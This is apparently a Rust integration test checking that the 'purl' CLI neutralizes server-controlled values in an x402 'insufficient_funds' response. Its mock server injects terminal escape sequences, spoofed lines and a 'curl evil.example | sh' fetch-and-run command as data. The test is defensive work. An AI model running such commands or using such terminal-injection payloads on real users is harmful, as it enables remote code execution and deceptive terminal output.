//! End-to-end check that server-controlled values in an `insufficient_funds`
//! response are neutralized before they reach the terminal.

mod common;

use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::thread;
use std::time::Duration;

use common::{test_command, TestConfigBuilder, TEST_EVM_KEY};

const IO_TIMEOUT: Duration = Duration::from_secs(10);

fn read_request(stream: &mut TcpStream) {
    stream.set_read_timeout(Some(IO_TIMEOUT)).ok();
    let mut buf = Vec::new();
    let mut chunk = [0u8; 4096];
    while !buf.windows(4).any(|w| w == b"\r\n\r\n") {
        match stream.read(&mut chunk) {
            Ok(0) | Err(_) => break,
            Ok(n) => buf.extend_from_slice(&chunk[..n]),
        }
    }
}

fn write_402(stream: &mut TcpStream, body: &str) {
    let response = format!(
        "HTTP/1.1 402 Payment Required\r\nContent-Type: application/json\r\n\
         Content-Length: {}\r\nConnection: close\r\n\r\n{}",
        body.len(),
        body
    );
    stream.write_all(response.as_bytes()).ok();
    stream.flush().ok();
}

/// Serve a valid challenge first, then an `insufficient_funds` response whose
/// network and asset contain control characters and multibyte text.
fn spawn_server() -> (String, thread::JoinHandle<()>) {
    let listener = TcpListener::bind("127.0.0.1:0").expect("bind loopback");
    let addr = listener.local_addr().unwrap();

    let challenge = r#"{"x402Version":1,"error":"Payment Required","accepts":[{
        "scheme":"exact","network":"base-sepolia","maxAmountRequired":"1000",
        "asset":"0x036CbD53842c5426634e7929541eC2318f3dCF7e",
        "payTo":"0x0000000000000000000000000000000000000000",
        "resource":"http://127.0.0.1/data","description":"test",
        "mimeType":"application/json","maxTimeoutSeconds":300,
        "extra":{"name":"USDC","version":"2"}}]}"#
        .to_string();

    let insufficient = r#"{"x402Version":1,"error":"insufficient_funds","accepts":[{
        "scheme":"exact",
        "network":"evil\u001b[2J\u0007\u0085\r\nFAKE-TRUSTED-LINE\nrun: curl evil.example | sh",
        "maxAmountRequired":"1000",
        "asset":"0x12\u2026456789abcdef\u001b]0;pwned\u0007\r\nFAKE-ASSET-LINE\u009b2J",
        "payTo":"0x0000000000000000000000000000000000000000",
        "resource":"http://127.0.0.1/data","description":"test",
        "mimeType":"application/json","maxTimeoutSeconds":300}]}"#
        .to_string();

    let handle = thread::spawn(move || {
        for body in [challenge, insufficient] {
            let (mut stream, _) = listener.accept().expect("accept");
            read_request(&mut stream);
            write_402(&mut stream, &body);
        }
    });

    (format!("http://{addr}/data"), handle)
}

#[test]
fn insufficient_funds_output_neutralizes_server_controlled_values() {
    let (url, server) = spawn_server();
    let temp_dir = TestConfigBuilder::new().with_default_evm().build();

    let mut std_cmd = test_command(&temp_dir);
    std_cmd
        .env("NO_COLOR", "1")
        .args(["--private-key", TEST_EVM_KEY, &url]);
    let output = assert_cmd::Command::from_std(std_cmd)
        .timeout(Duration::from_secs(60))
        .output()
        .expect("run purl");
    server.join().expect("server thread");

    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
    let stdout = String::from_utf8_lossy(&output.stdout).to_string();

    for text in [&stderr, &stdout] {
        assert!(
            !text.chars().any(|c| c.is_control() && c != '\n'),
            "unexpected control character in output: {text:?}"
        );
    }

    // Normal guidance survives.
    assert!(
        stderr.contains("insufficient"),
        "missing guidance: {stderr:?}"
    );
    assert!(
        stderr.contains("Check your balance with 'purl balance'"),
        "missing guidance: {stderr:?}"
    );

    // Injected text must stay inline rather than starting a new line.
    for marker in ["FAKE-TRUSTED-LINE", "FAKE-ASSET-LINE", "run: curl"] {
        for line in stderr.lines() {
            if line.contains(marker) {
                assert!(
                    line.contains("insufficient") || line.contains("Required:"),
                    "injected text on its own line: {line:?}"
                );
            }
        }
    }
}
